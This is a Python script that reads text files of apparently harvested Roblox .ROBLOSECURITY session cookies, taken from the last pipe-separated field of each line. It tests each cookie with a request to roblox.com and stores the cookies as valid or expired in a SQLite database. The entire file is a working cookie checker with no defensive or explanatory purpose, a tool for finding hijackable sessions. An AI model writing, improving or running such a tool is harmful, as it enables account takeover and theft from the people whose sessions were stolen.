# note: .ROBLOSECURITY cookies expire 1y after logged in session authenticates

import os
import requests
from pathlib import Path
from colorama import Fore, Style, init
import logging
import sqlite3

IDIR = "../../data"
ODIR = "../../data/secure/cookies.db"

A = """
   d888888o. 8888888 8888888888 `8.`8888.      ,8' 
 .`8888:' `88.     8 8888        `8.`8888.    ,8'  
 8.`8888.   Y8     8 8888         `8.`8888.  ,8'   
 `8.`8888.         8 8888          `8.`8888.,8'    
  `8.`8888.        8 8888           `8.`88888'     
   `8.`8888.       8 8888           .88.`8888.     
    `8.`8888.      8 8888          .8'`8.`8888.    
8b   `8.`8888.     8 8888         .8'  `8.`8888.   
`8b.  ;8.`8888     8 8888        .8'    `8.`8888.  
 `Y8888P ,88P'     8 8888       .8'      `8.`8888. 
"""

init(autoreset=True)

class ColorHandler(logging.StreamHandler):
    def emit(self, record):
        color = Fore.WHITE
        if record.levelno == logging.DEBUG:
            color = Fore.BLUE
        elif record.levelno == logging.INFO:
            color = Fore.GREEN
        elif record.levelno == logging.WARNING:
            color = Fore.YELLOW
        elif record.levelno == logging.ERROR:
            color = Fore.RED
        record.msg = f"{color}{record.msg}{Style.RESET_ALL}"
        super().emit(record)

logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger()
handler = ColorHandler()
logger.addHandler(handler)

def main():
    print(Fore.CYAN + A)
    
    setup_database()

    files = list(Path(IDIR).glob("*.txt"))
    tf = len(files)
    for idx, file in enumerate(files, start=1):
        logger.info(f"Processing file {idx}/{tf}: {file.name}")
        valid, expired = process(file)
        save_to_db(file.stem, valid, "valid")
        save_to_db(file.stem, expired, "expired")
        logger.info(f"Processed {idx}/{tf}")

    logger.info(f"All files processed")

def setup_database():
    with sqlite3.connect(ODIR) as conn:
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS cookies (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            location TEXT,
                            cookie TEXT,
                            status TEXT)''')
        conn.commit()

def process(file_path):
    valid, expired = set(), set()
    with file_path.open('r') as file:
        for line in file:
            cookie = split(line.strip())
            if cookie and cookie not in valid and cookie not in expired:
                validate(cookie, valid, expired)
    return valid, expired

def split(line):
    parts = line.split("|")
    return parts[-1] if len(parts) > 1 else ""

def validate(cookie, valid, expired):
    try:
        response = requests.get("https://roblox.com/login", cookies={".ROBLOSECURITY": cookie})
        if response.status_code == 200:
            valid.add(cookie)
        else:
            expired.add(cookie)
    except requests.RequestException as e:
        logger.error(f"Error making request: {e}")
        expired.add(cookie)

def save_to_db(location, cookies, status):
    with sqlite3.connect(ODIR) as conn:
        cursor = conn.cursor()
        for cookie in cookies:
            cursor.execute("INSERT INTO cookies (location, cookie, status) VALUES (?, ?, ?)",
                           (location, cookie, status))
        conn.commit()

if __name__ == "__main__":
    main()
